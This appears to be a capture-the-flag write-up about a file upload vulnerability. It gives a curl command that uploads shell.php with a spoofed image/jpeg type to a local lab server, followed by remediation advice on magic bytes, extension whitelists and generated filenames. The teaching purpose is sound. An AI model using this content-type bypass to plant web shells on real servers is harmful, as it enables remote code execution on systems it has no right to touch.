# File Upload

## 📖 Vulnerability Explanation
A file upload vulnerability occurs when a server doesn't validate an uploaded file properly. This can be abused by an attacker to perform RCE in the server by uploading executable code into a malicious crafted file.

## ⚙️ Exploitation Process
By uploading a php file and changing the image type property in the request body, we can trick the server to accept the executable code.

- Create a file called shell.php and send this request with curl to claim the flag:

```
curl -s -X POST "http://localhost:9090/?page=upload" -F "uploaded=@shell.php;filename=shell.php;type=image/jpeg" -F "Upload=Upload" | grep flag
```

## 🔧 Fix
To protect against file upload attacks, it's crutial to perform a secure sanitization.

The process should be as following:
- **Check file magic bytes**: To make sure the file is an actual image
- **Allow only certain extensions**: Create a whitelist of allowed extensions
- **Generate a filename on the server**: Generating a filename on the server prevents problems with filename attack techniques

## ☝️🤓 Advanced explanation
It is also possible to use a file processing tool, such as ImageMagick. However, it is crutial to make sure the packages are up to date, as it is common to see vulnerabilities associated with these tools.